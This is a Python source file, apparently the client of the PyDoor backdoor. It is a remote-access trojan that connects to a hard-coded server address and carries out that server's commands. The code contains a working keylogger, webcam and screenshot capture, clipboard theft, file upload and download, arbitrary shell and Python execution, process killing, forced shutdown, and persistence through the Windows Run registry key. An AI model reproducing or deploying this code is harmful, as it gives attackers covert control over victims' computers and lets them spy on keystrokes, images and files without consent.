"""
https://github.com/Y4hL/PyDoor

Author(s): Y4hL

License: [gpl-3.0](https://www.gnu.org/licenses/gpl-3.0.html)
"""
import os
import sys
import time
import json
import getpass
import shutil
import platform
import subprocess
import PIL
from pydoc import help
from zipfile import ZipFile
import traceback
import socket
import logging
from typing import Tuple, Union
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from io import StringIO
from io import BytesIO
import pyscreeze
from psutil import AccessDenied
import psutil
from typing import Union
import threading
import requests
import cv2
import pyperclip



if getattr(sys, 'frozen', False):
    CLIENT_PATH = os.path.dirname(sys.executable)
elif __file__:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))

os.chdir(CLIENT_PATH)
LOG = os.path.join(CLIENT_PATH, 'log.log')

if platform.system() == 'Windows':
    import ctypes


logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
logging.info('Client Started.')


def errors(error: Exception, line: bool = True) -> str:
    """ Error Handler """
    error_class = error.__class__.__name__
    error_msg = f'{error_class}:'
    try:
        error_msg += f' {error.args[0]}'
    except (IndexError, AttributeError):
        pass
    if line:
        try:
            _, _, traceb = sys.exc_info()
            line_number = traceback.extract_tb(traceb)[-1][1]
            error_msg += f' (line {line_number})'
        except Exception:
            pass
    return error_msg

class ESocket:
    """
    Encrypted Socket

    Perform ECDH with the peer, agreeing on a session key, which is then used for AES256 encryption

    Header has a set size (default: 16 bytes) and consists of 3 data points
    The first byte determines if the packet is multipacket (is split into multiple packets)
    The second byte determines if the data is an error
    The rest of the header is used to set the size of the incoming data
    """

    # Byte length of the complete header
    header_length = 16
    # Byte length of the size header
    size_header_length = header_length - 2

    # AES encryption
    encryptor = None
    decryptor = None

    # Padding for AES encryption
    _pad = padding.PKCS7(256)

    def __init__(self, sock: socket.socket, server: bool = False) -> None:
        """ Define variables """
        self.sock = sock
        self.server = server

        self.handshake()

    def close(self):
        """ Close socket """
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()

    def encrypt(self, data: bytes) -> bytes:
        """ Encrypt data """
        padder = self._pad.padder()
        data = padder.update(data) + padder.finalize()

        encryptor = self._cipher.encryptor()
        data = encryptor.update(data) + encryptor.finalize()
    
        return data

    def decrypt(self, data: bytes) -> bytes:
        """ Decrypt data """

        decryptor = self._cipher.decryptor()
        data = decryptor.update(data) + decryptor.finalize()

        unpadder = self._pad.unpadder()
        data = unpadder.update(data) + unpadder.finalize()

        return data

    def handshake(self) -> bool:
        """
        Handshake with Client

        Uses ECDH to agree on a session key
        Session key is used for AES256 encryption
        """

        # Use ECDH to derive a key for fernet encryption

        private_key = ec.generate_private_key(ec.SECP521R1())

        serialized_public_key = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM, 
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        # Exchange public keys
        logging.debug('retrieving peer public key')
        if self.server:
            self._send(serialized_public_key)
            _, serialized_peer_public_key = self._recv()
        else:
            _, serialized_peer_public_key = self._recv()
            self._send(serialized_public_key)

        peer_public_key = serialization.load_pem_public_key(serialized_peer_public_key)

        shared_key = private_key.exchange(ec.ECDH(), peer_public_key)

        # Perform key derivation.

        derived_key = HKDF(
            algorithm=hashes.SHA512(),
            length=32,
            salt=None,
            info=None
        ).derive(shared_key)

        logging.debug('agreeing on iv with peer')
        if self.server:
            iv = os.urandom(16)
            self._send(iv)
        else:
            _, iv = self._recv()

        self._cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv))

        return True

    def make_header(self, data: bytes, error: str) -> Tuple[bytes, Union[bytes, None]]:
        """ Make header for data """

        if len(error) > 1:
            raise

        split = 0
        extra_data = None
        packet_data = data

        max_data_size = int('9' * self.size_header_length)

        if len(data) > max_data_size:
            split = 1
            packet_data = data[:max_data_size]
            extra_data = data[max_data_size+1:]

        size_header = f'{len(packet_data)}'

        if len(size_header) < self.size_header_length:
            # Pad extra zeros to size header
            size_header = '0' * (self.size_header_length - len(size_header)) + size_header

        packet = f'{split}{error}{size_header}'.encode() + packet_data

        return packet, extra_data

    def parse_header(self, header: bytes) -> Tuple[bool, str, int]:
        """ Parse esocket header """

        multipacket = bool(int(chr(header[0])))
        error = chr(header[1])
        size_header = int(header[2:])

        return multipacket, error, size_header

    def _recv(self) -> Tuple[str, bytes]:
        """ Receive data from client """

        def recvall(amount: int) -> bytes:
            """ Receive x amount of bytes """
            data = b''
            while len(data) < amount:
                buffer = self.sock.recv(amount - len(data))
                if not buffer:
                    return
                data += buffer
            return data

        header = recvall(self.header_length)
        multipacket, error, size_header = self.parse_header(header)
        logging.debug(f'parsed header: {multipacket}/{error}/{size_header}')

        data = recvall(size_header)
        logging.debug('got packet')

        if multipacket:
            _, next_data = self._recv()
            return error, data + next_data

        return error, data

    def postrecv(self, data: bytes) -> bytes:
        """ Post-receive decryption """
        return self.decrypt(data)

    def recv(self) -> Tuple[str, bytes]:
        """ Receive data from client """
        error, data = self._recv()
        return error, self.postrecv(data)

    def _send(self, data: bytes, error: str = '0') -> None:
        """ Send data to client """

        packet, extra_data = self.make_header(data, error)

        self.sock.sendall(packet)
        logging.debug('sent packet')
        if extra_data:
            self._send(extra_data)

    def presend(self, data: bytes) -> bytes:
        """ Pre-send encryption """
        # Pad data
        return self.encrypt(data)

    def send(self, data: bytes, error: str = '0') -> None:
        """ Send data to client """
        self._send(self.presend(data), error)


def reverse_readline(filename: str, buf_size: int = 16384) -> str:
    """A generator that returns the lines of a file in reverse order"""

    # Credit: https://stackoverflow.com/a/23646049/10625567

    with open(filename) as file:
        segment = None
        offset = 0
        file.seek(0, os.SEEK_END)
        file_size = remaining_size = file.tell()
        while remaining_size > 0:
            offset = min(file_size, offset + buf_size)
            file.seek(file_size - offset)
            buffer = file.read(min(remaining_size, buf_size))
            remaining_size -= buf_size
            lines = buffer.split('\n')
            if segment is not None:
                if buffer[-1] != '\n':
                    lines[-1] += segment
                else:
                    yield segment
            segment = lines[0]
            for index in range(len(lines) - 1, 0, -1):
                if lines[index]:
                    yield lines[index]
        if segment is not None:
            yield segment



def ps() -> list:
    """ List processes running on the system """
    processes = []
    for process in psutil.process_iter():
        try:
            processes.append(process.as_dict())
        except psutil.NoSuchProcess:
            pass
    return processes


def kill(pid: int) -> None:
    """ Kill Process by PID """
    logging.info('Killing process with the pid %s and all its children' % str(pid))
    process = psutil.Process(pid)
    for proc in process.children(recursive=True):
        proc.kill()
        logging.debug('killed child with pid %s' % str(proc.pid))
    process.kill()
    logging.debug('killed parent with pid %s' % str(pid))




def copy(text: str) -> Union[None, str]:
    """
    Copy text into clipboard

    returns error/None
    """
    try:
        pyperclip.copy(text)
    except pyperclip.PyperclipException as error:
        logging.error('Error copying "%s" to clipboard: %s' % (text, errors(error)))
        return errors(error)
    else:
        logging.info('Copied "%s" to clipboard' % text)

def paste() -> Union[bool, str]:
    """
    Pastes clipboard 

    returns True/False, clipboard/error
    """
    try:
        clipboard = pyperclip.paste()
    except pyperclip.PyperclipException as error:
        logging.error('Could not paste from clipboard: %s' % errors(error))
        return False, errors(error)
    logging.info('Pasted from clipboard: %s' % clipboard)
    return True, clipboard



def onkeyboardevent(event):
    """ On Keyboard Event"""
    logging.info("%s", event)

class Keylogger:
    """ Keylogger """

    def __init__(self) -> None:
        """
        Check keylogger state from log
        then enable or disable it accordingly
        """
        try:
            from pynput.keyboard import Listener
        except ImportError:
            self.runnable = False
        else:
            self.runnable = True
            self.listener = Listener(on_press=onkeyboardevent)

    def start(self) -> bool:
        """ Start keylogger """
        if not self.runnable:
            logging.error('pynput not found, could not start keylogger')
            return False
        if not self.listener.running:
            self.listener.start()
            logging.info('Started Keylogger')
        return True

    def stop(self) -> bool:
        """ Attempt to stop the keylogger """
        if not self.runnable:
            logging.info('pynput not found')
            return False
        if self.listener.running:
            self.listener.stop()
            logging.info('Stopped Keylogger')
            threading.Thread.__init__(self.listener)
        return True

    def state(self) -> bool:
        """ Get the state of the keylogger """
        return self.listener.running

if platform.system() == 'Windows':
    from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue
    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
    STARTUP_REG_NAME = 'test tarek'


def add_startup() -> Union[str, None]:
    """ Add Client to startup """
    # returns None/error
    if platform.system() != 'Windows':
        return 'Startup feature is only for Windows'
    if getattr(sys, 'frozen', False):
        path = sys.executable
    elif __file__:
        path = os.path.abspath(__file__)
    try:
        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_ALL_ACCESS)
        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)
        CloseKey(key)
    except Exception as error:
        logging.error('Error adding client to startup: %s' % error)
        return error
    else:
        logging.info('Adding client to startup successful')


def remove_startup() -> Union[str, None]:
    """ Remove Client from Startup """
    # returns None/error
    if platform.system() != 'Windows':
        return 'Startup feature is only for Windows'
    try:
        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_ALL_ACCESS)
        DeleteValue(key, STARTUP_REG_NAME)
        CloseKey(key)
    except FileNotFoundError:
        # File was never registered.
        # Still returns True, since it's not in startup
        logging.info('FileNotFoundError: assume registry key does not exist')
    except WindowsError as error:
        logging.error('Error removing client from startup: %s' % error)
        return error
    else:
        logging.info('Removed Client from Startup')


def pyshell(command: str) -> Tuple[str, str]:
    """ exec python commands """
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    error = None
    try:
        exec(command)
    except Exception as err:
        error = errors(err, line=False)
    finally:
        sys.stdout = old_stdout

    return redirected_output.getvalue(), error
    




def download(link: str, filename: str) -> Union[str, None]:
    """ Download files from the internet """
    try:
        request = requests.get(link)
        with open(filename, 'wb') as file:  # Use 'wb' for binary mode
            file.write(request.content)
    except Exception as error:
        logging.error('Error downloading "%s" from %s: %s' % (filename, link, error))
        return str(error)
    else:
        logging.info('Downloaded "%s" from %s' % (filename, link))

def capture_webcam() -> Union[bytes, None]:
    """ Capture a webcam image """
    camera = cv2.VideoCapture(0)
    state, img = camera.read()
    camera.release()
    if state:
        is_success, arr = cv2.imencode('.png', img)
        if is_success:
            logging.info('Captured webcam')
            return arr.tobytes()
    logging.error('Error capturing webcam')





class Client(object):
    """ Client Object """

    # ESocket
    esock = None
    sock = socket.socket()

    def __init__(self) -> None:

        # Try to run keylogger
        self.keylogger = Keylogger()
        if self.keylogger.runnable:
            try:
                for line in reverse_readline(LOG):
                    if 'Started Keylogger' in line:
                        self.keylogger.start()
                        break
                    if 'Stopped Keylogger' in line:
                        break
            except Exception:
                logging.error('error reading log')

        if platform.system() == 'Windows':
            self._pwd = ' && cd'
        else:
            self._pwd = ' && pwd'

    def connect(self, address) -> None:
        """ Connect to a remote socket """
        try:
            self.sock.connect(address)
        except (ConnectionRefusedError, TimeoutError):
            raise
        except OSError as error:
            # Usually raised when socket is already connected
            # Close socket -> Reconnect
            logging.error('%s: Attempting reconnect' % str(error))
            self.sock.close()
            self.sock = socket.socket()
            raise
        except Exception as error:
            logging.error(errors(error))
            raise
        logging.info('Connected to server: %s' % (str(address)))
        self.esock = ESocket(self.sock)
        try:
            self.esock.send(socket.gethostname().encode())
        except socket.error as error:
            logging.error(errors(error))
        self.address = address

    def send_json(self, data) -> None:
        """ Send JSON data to Server """
        self.esock.send(json.dumps(data).encode())

    def send_file(self, file_to_transfer: str, block_size: int = 32768) -> None:
        """ Send file to Server """
        # returns None
        try:
            with open(file_to_transfer, 'rb') as file:
                while True:
                    block = file.read(block_size)
                    if not block:
                        break
                    self.esock.send(block)

        except (FileNotFoundError, PermissionError) as error:
            self.esock.send(errors(error).encode(), '1')
            logging.error('Error transferring %s to Server: %s' % (file_to_transfer, errors(error)))
        else:
            self.esock.send(b'FILE_TRANSFER_DONE', '9')
            logging.info('Transferred %s to Server', file_to_transfer)

    def receive_file(self, save_as: str) -> None:
        """ Receive File from Server"""
        # returns None

        try:
            with open(save_as, 'wb') as file:
                self.esock.send(b'Successfully opened file.')
                while True:
                    _, data = self.esock.recv()
                    if data == b'FILE_TRANSFER_DONE':
                        break
                    file.write(data)

        except (FileNotFoundError, PermissionError) as error:
            self.esock.send(errors(error).encode(), error='1')
            logging.error('Error receiving %s from Server: %s' % (save_as, errors(error)))
        else:
            logging.info('Transferred %s to Client', save_as)

    def receive_commands(self) -> None:
        """ Receives Commands from Server """
        while True:
            error, msg = self.esock.recv()
            data = json.loads(msg.decode())

            if data[0] == 'GETCWD':
                self.esock.send(os.getcwdb())
                continue

            if data[0] == 'LIST':
                continue

            if data[0] == 'PLATFORM':
                self.esock.send(platform.system().encode())
                continue

            if data[0] == 'LOG_FILE':
                self.esock.send(LOG.encode())
                continue

            if data[0] == '_INFO':
                self.send_json([platform.system(), os.path.expanduser('~'), getpass.getuser()])
                continue

            if data[0] == 'FROZEN':
                self.send_json(getattr(sys, 'frozen', False))
                continue

            if data[0] == 'PS':
                self.send_json(ps())
                continue

            if data[0] == 'KILL':
                try:
                    kill(data[1])
                except AccessDenied:
                    self.esock.send(b'Access Denied', '1')
                else:
                    self.esock.send(b'Killed')
                continue

            if data[0] == 'EXEC':
                output, error = pyshell.pyshell(data[1])
                self.send_json([output, error])
                continue

            if data[0] == 'RESTART_SESSION':
                self.send_json(True)
                logging.info('Restarting session')
                break

            if data[0] == 'CLOSE':
                try:
                    self.send_json(True)
                    logging.info('Closing connection and exiting')
                    self.esock.close()
                except Exception:
                    pass
                sys.exit(0)

            if data[0] == 'ADD_STARTUP':
                self.send_json(add_startup())
                continue

            if data[0] == 'REMOVE_STARTUP':
                self.send_json(remove_startup())
                continue

            if data[0] == 'LOCK':
                if platform.system() == 'Windows':
                    self.send_json(True)
                    ctypes.windll.user32.LockWorkStation()
                    logging.info('Locked workstation')
                else:
                    self.send_json(False)
                continue

            if data[0] == 'SHUTDOWN':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                logging.info('Shutting down system')
                subprocess.Popen('shutdown /s /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RESTART':
                if platform.system() != 'Windows':
                    self.send_json(False)
                    continue
                self.send_json(True)
                logging.info('Restarting system')
                subprocess.Popen('shutdown /r /t 0', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(5)
                break

            if data[0] == 'RECEIVE_FILE':
                self.send_file(data[1])
                continue

            if data[0] == 'SEND_FILE':
                self.receive_file(data[1])
                continue

            if data[0] == 'ZIP_FILE':
                try:
                    with ZipFile(data[1], 'w') as ziph:
                        ziph.write(data[2])
                except Exception as err:
                    logging.error('Error zipping file %s into %s: %s' % (data[2], data[1], errors(error)))
                    self.send_json(errors(err))
                else:
                    logging.info('Zipped file %s into %s' % (data[2], data[1]))
                    self.send_json(None)
                continue

            if data[0] == 'ZIP_DIR':
                logging.info('Zipping Folder: %s', data[2])
                try:
                    shutil.make_archive(data[1], 'zip', data[2])
                except Exception as error:
                    logging.error('Error zipping directory %s into %s.zip: %s' % (data[2], data[1], errors(error)))
                    self.send_json(errors(error))
                else:
                    logging.info('Zipped folder %s into %s.zip' % (data[2], data[1]))
                    self.send_json(None)
                continue

            if data[0] == 'UNZIP':
                try:
                    with ZipFile(data[1], 'r') as ziph:
                        ziph.extractall()
                except Exception as error:
                    logging.error('Failed unzipping %s: %s' % (data[1], errors(error)))
                    self.send_json(errors(error))
                else:
                    logging.info('Unzipped %s' % data[1])
                    self.send_json(None)
                continue

            if data[0] == 'DOWNLOAD':
                error = download(data[1], data[2])
                if error:
                    self.send_json(error)
                else:
                    self.send_json(None)
                continue

            if data[0] == 'INFO':
                self.esock.send(f'User: {getpass.getuser()}\n' \
                    f'OS: {platform.system()} {platform.release()} ' \
                    f'({platform.platform()}) ({platform.machine()})\n' \
                    f'Frozen (.exe): {getattr(sys, "frozen", False)}\n'.encode())
                continue

            if data[0] == 'SCREENSHOT':
                success, content = screenshot()
                if success:
                    self.esock.send(content)
                else:
                    self.esock.send(content, '1')
                continue

            if data[0] == 'WEBCAM':
                image = capture_webcam()
                if image:
                    self.esock.send(image)
                else:
                    self.esock.send(b'ERROR', '1')
                continue

            if data[0] == 'START_KEYLOGGER':
                self.send_json(self.keylogger.start())
                continue

            if data[0] == 'KEYLOGGER_STATUS':
                self.send_json(self.keylogger.state())

            if data[0] == 'STOP_KEYLOGGER':
                self.send_json(self.keylogger.stop())
                continue

            if data[0] == 'COPY':
                self.send_json(copy(data[1]))
                continue

            if data[0] == 'PASTE':
                self.send_json(paste())
                continue

            if data[0] == 'SHELL':

                execute = lambda command: subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                split_command = data[1].split(' ')[0].strip().lower()

                if split_command in ['cd', 'chdir']:
                    process = execute(data[1] + self._pwd)
                    error = process.stderr.read().decode()
                    if error:
                        self.send_json(['ERROR', error])
                        continue
                    output = process.stdout.read().decode()
                    # Command should only return one line (cwd)
                    if output.count('\n') > 1:
                        self.send_json(['ERROR', output])
                        continue
                    os.chdir(output.strip())
                    self.send_json([os.getcwd()])
                    continue

                process = execute(data[1])
                for line in iter(process.stdout.readline, ''):
                    if line == b'':
                        break
                    self.esock.send(line.replace(b'\n', b''))
                    if self.esock.recv()[1] == b'QUIT':
                        kill(process.pid)
                        break
                self.esock.send(process.stderr.read())
                self.esock.recv()
                self.esock.send(b'DONE', '1')
                continue


def main(address: tuple, retry_timer: int = 10) -> None:
    """ Run Client """
    # RETRY_TIMER: Time to wait before trying to reconnect
    client = Client()
    logging.info('Starting connection loop')
    while True:
        try:
            client.connect(address)
        except Exception as error:
            print(error)
            time.sleep(retry_timer)
        else:
            break
    try:
        client.receive_commands()
    except Exception as error:
        logging.critical(errors(error))


if __name__ == '__main__':

    # Add Client to Startup when Client is run
    # add_startup()
    while True:
        main(('192.168.1.6', 9998))
